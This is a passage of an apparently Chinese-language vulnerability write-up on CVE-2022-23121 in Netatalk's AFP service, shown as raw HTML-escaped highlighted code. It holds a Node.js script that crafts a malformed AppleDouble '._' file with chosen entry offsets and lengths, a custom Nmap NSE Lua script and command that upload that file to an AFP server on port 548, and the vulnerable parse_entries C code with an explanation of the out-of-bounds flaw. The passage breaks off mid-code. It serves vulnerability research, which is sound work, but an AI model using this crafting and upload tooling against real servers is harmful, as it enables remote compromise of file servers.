&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">fp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;./&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">origname&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;read&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// resource fork data 部分：
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">buffer2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Buffer&lt;/span>.&lt;span style="color:#a6e22e">from&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;a&amp;#34;&lt;/span>.&lt;span style="color:#a6e22e">repeat&lt;/span>(&lt;span style="color:#ae81ff">0x12&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">buffer3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Buffer&lt;/span>.&lt;span style="color:#a6e22e">from&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;a&amp;#34;&lt;/span>.&lt;span style="color:#a6e22e">repeat&lt;/span>(&lt;span style="color:#ae81ff">0x34&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">Buffer&lt;/span>.&lt;span style="color:#a6e22e">concat&lt;/span>([ &lt;span style="color:#a6e22e">buffer2&lt;/span>, &lt;span style="color:#a6e22e">buffer3&lt;/span>]).&lt;span style="color:#a6e22e">length&lt;/span>) &lt;span style="color:#75715e">// 打印的 resource fork data 长度。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">resoLength&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Buffer&lt;/span>.&lt;span style="color:#a6e22e">concat&lt;/span>([&lt;span style="color:#a6e22e">buffer2&lt;/span>, &lt;span style="color:#a6e22e">buffer3&lt;/span>]).&lt;span style="color:#a6e22e">length&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">findoff&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;findoff&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">undefined&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">:&lt;/span> parseInt(&lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;findoff&amp;#39;&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">findlen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;findlen&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">undefined&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">:&lt;/span> parseInt(&lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;findlen&amp;#39;&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">forklen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;forklen&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">undefined&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">:&lt;/span> parseInt(&lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;forklen&amp;#39;&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">forkoff&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;forkoff&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">undefined&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">:&lt;/span> parseInt(&lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;forkoff&amp;#39;&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 如果name为空则为read
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;name&amp;#34;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">undefined&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#a6e22e">origname&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;name&amp;#34;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;findoff:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">findoff&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; findlen:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">findlen&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; forkoff:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">forkoff&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; forklen:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">forklen&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">xattr&lt;/span>.&lt;span style="color:#a6e22e">create&lt;/span>({
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;com.example.Attribute&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;my data&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}, &lt;span style="color:#a6e22e">resoLength&lt;/span>, &lt;span style="color:#a6e22e">findoff&lt;/span>, &lt;span style="color:#a6e22e">findlen&lt;/span>, &lt;span style="color:#a6e22e">forkoff&lt;/span>, &lt;span style="color:#a6e22e">forklen&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">buffer4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Buffer&lt;/span>.&lt;span style="color:#a6e22e">concat&lt;/span>([&lt;span style="color:#a6e22e">buffer&lt;/span>, &lt;span style="color:#a6e22e">buffer2&lt;/span>, &lt;span style="color:#a6e22e">buffer3&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fs&lt;/span>.&lt;span style="color:#a6e22e">writeFile&lt;/span>(&lt;span style="color:#a6e22e">fp&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;._&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">name&lt;/span>, &lt;span style="color:#a6e22e">buffer4&lt;/span>, { &lt;span style="color:#a6e22e">mode&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0o777&lt;/span> }, &lt;span style="color:#a6e22e">err&lt;/span> =&amp;gt; {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">err&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">error&lt;/span>(&lt;span style="color:#a6e22e">err&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;success write file, file path: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">fp&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;._&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">name&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//文件写入成功。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fs&lt;/span>.&lt;span style="color:#a6e22e">writeFile&lt;/span>(&lt;span style="color:#a6e22e">fp&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">name&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;hello world&amp;#34;&lt;/span>, { &lt;span style="color:#a6e22e">mode&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0o777&lt;/span> }, &lt;span style="color:#a6e22e">err&lt;/span> =&amp;gt; {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">err&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">error&lt;/span>(&lt;span style="color:#a6e22e">err&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;success write file, file path: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">fp&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">name&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//文件写入成功。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fs&lt;/span>.&lt;span style="color:#a6e22e">chmod&lt;/span>(&lt;span style="color:#a6e22e">fp&lt;/span>&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">name&lt;/span>, &lt;span style="color:#ae81ff">0o777&lt;/span>, () =&amp;gt; {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;change &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">fp&lt;/span>&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; mode&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>})
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fs&lt;/span>.&lt;span style="color:#a6e22e">chmod&lt;/span>(&lt;span style="color:#a6e22e">fp&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;._&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">name&lt;/span>, &lt;span style="color:#ae81ff">0o777&lt;/span>, () =&amp;gt; {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;change &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">fp&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;._&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; mode&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>})
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>如何将文件上传到服务器&lt;/strong>&lt;/p>
&lt;p>生成文件后，为了更贴合实际漏洞利用场景，即生成有效AppleDouble文件后通过AFP客户端上传到AFP服务器，这里借鉴Nmap自带的afp的lua库，编写我们自己的上传NSE脚本。&lt;/p>
&lt;p>在Nmap中原生包含了afp-ls的NSE脚本，其引用的lua库afp.lua内含有我们通过AFP协议上传文件需要的接口WriteFile，在上传文件的NSE脚本中调用该接口即可&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/2.png" />&lt;/p>
&lt;p>在scripts目录下新建afp-upfile.nse文件，将afp-ls.nse内容粘贴进去，去掉列出文件逻辑的代码，之后编写lua代码，读取文件，将文件内容传给afp.lua内的WriteFile函数即可，最终如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-lua" data-lang="lua">&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>action &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(host, port)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">-- 这里和afp-ls的逻辑一样&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">local&lt;/span> msg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">local&lt;/span> uploadpath &lt;span style="color:#f92672">=&lt;/span> args[&lt;span style="color:#e6db74">&amp;#34;uploadpath&amp;#34;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">local&lt;/span> filepath &lt;span style="color:#f92672">=&lt;/span> args[&lt;span style="color:#e6db74">&amp;#34;filepath&amp;#34;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">local&lt;/span> poc &lt;span style="color:#f92672">=&lt;/span> io.open(filepath,&lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">local&lt;/span> data &lt;span style="color:#f92672">=&lt;/span> poc:read(&lt;span style="color:#e6db74">&amp;#34;*all&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> poc:close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> status, msg &lt;span style="color:#f92672">=&lt;/span> afpHelper:WriteFile(uploadpath, data)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> status, response &lt;span style="color:#f92672">=&lt;/span> afpHelper:Logout()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> status, response &lt;span style="color:#f92672">=&lt;/span> afpHelper:CloseSession()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> data
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>利用该脚本，可以通过nmap上传文件到afp服务器&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -p &lt;span style="color:#ae81ff">548&lt;/span> --script&lt;span style="color:#f92672">=&lt;/span>afp-upfile --script-args &lt;span style="color:#e6db74">&amp;#34;uploadpath=test/._cmd,filepath=./._cmd&amp;#34;&lt;/span> ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="漏洞成因">漏洞成因&lt;/h3>
&lt;p>&lt;code>libatalk/adouble/ad_open.c#parse_entries&lt;/code> 函数为Nettatalk解析buf内的数据到自定义的结构体，通过读取buf内对应offset的数据到传入的ad指针指向的&lt;code>adouble&lt;/code>结构体的某些成员内，完成对相应值的设置，&lt;strong>其中buf数据来自读取的._filename的文件&lt;/strong>。在循环中将buf首地址加上某个offset中的数据通过&lt;code>memcpy&lt;/code>函数拷贝到ad指向的adouble结构体变量内，在循环内含有一个if判断，当处于以下情况时，&lt;code>parse_entries&lt;/code> 会返回-1并且打印警告日志&lt;/p>
&lt;ol>
&lt;li>&lt;code>eid &amp;gt; ADEID_MAX，ADEID_MAX=20&lt;/code>&lt;/li>
&lt;li>&lt;code>off&amp;gt;sizeof(ad-&amp;gt;ad_data)&lt;/code>&lt;/li>
&lt;li>eid不等于2并且此时的entry的偏移和数据长度相加大于1024&lt;/li>
&lt;/ol>
&lt;p>即通过控制文件内的数据，我们可以控制adouble结构体内的entry的off+len使得entry.off+entry.len+buf超过buf的边界，正常流程中adouble结构体内的entry的off+len+buf不应该越过buf边界。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">parse_entries&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">adouble&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ad, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, &lt;span style="color:#66d9ef">uint16_t&lt;/span> nentries)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">uint32_t&lt;/span> eid, len, off;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* now, read in the entry bits */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (; nentries &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; nentries&lt;span style="color:#f92672">--&lt;/span> ) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memcpy(&lt;span style="color:#f92672">&amp;amp;&lt;/span>eid, buf, &lt;span style="color:#66d9ef">sizeof&lt;/span>( eid ));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> eid &lt;span style="color:#f92672">=&lt;/span> get_eid(ntohl(eid));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> buf &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#66d9ef">sizeof&lt;/span>( eid );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memcpy(&lt;span style="color:#f92672">&amp;amp;&lt;/span>off, buf, &lt;span style="color:#66d9ef">sizeof&lt;/span>( off ));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> off &lt;span style="color:#f92672">=&lt;/span> ntohl( off );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> buf &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#66d9ef">sizeof&lt;/span>( off );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memcpy(&lt;span style="color:#f92672">&amp;amp;&lt;/span>len, buf, &lt;span style="color:#66d9ef">sizeof&lt;/span>( len ));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> len &lt;span style="color:#f92672">=&lt;/span> ntohl( len );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> buf &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#66d9ef">sizeof&lt;/span>( len );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ad&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ad_eid[eid].ade_off &lt;span style="color:#f92672">=&lt;/span> off;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ad&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ad_eid[eid].ade_len &lt;span style="color:#f92672">=&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>eid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> eid &lt;span style="color:#f92672">&amp;gt;&lt;/span> ADEID_MAX
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> off &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#66d9ef">sizeof&lt;/span>(ad&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ad_data)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> ((eid &lt;span style="color:#f92672">!=&lt;/span> ADEID_RFORK) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (off &lt;span style="color:#f92672">+&lt;/span> len &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">sizeof&lt;/span>(ad&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ad_data)))) &lt;span style="color:#75715e">// ADEID_RFORK
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LOG(log_warning, logtype_ad, &lt;span style="color:#e6db74">&amp;#34;parse_entries: bogus eid: %u, off: %u, len: %u&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (uint)eid, (uint)off, (uint)len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> ret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// adouble 定义
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">adouble&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> ad_data[AD_DATASZ_MAX]; &lt;span style="color:#75715e">//AD_DATASZ_MAX = 1024
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>};
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在代码里，在以下几处函数中有调用&lt;code>parse_entries&lt;/code> 函数&lt;/p>
&lt;ul>
&lt;li>&lt;code>ad_header_read&lt;/code>&lt;/li>
&lt;li>&lt;code>ad_header_read_osx&lt;/code>&lt;/li>
&lt;li>&lt;code>ad_header_read_ea&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>在三处函数中，只有&lt;code>libatalk/adouble/ad_open.c#ad_header_read_osx&lt;/code>函数调用&lt;code>parse_entries&lt;/code>函数时，即使&lt;code>parse_entries&lt;/code>返回-1，该函数不会&lt;code>return&lt;/code>也不会进入异常处理流程，仅仅是通过日志记录，继续执行而不报错。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (parse_entries(&lt;span style="color:#f92672">&amp;amp;&lt;/span>adosx, buf, nentries) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LOG(log_warning, logtype_ad, &lt;span style="color:#e6db74">&amp;#34;ad_header_read(%s): malformed AppleDouble&amp;#34;&lt;/span>,
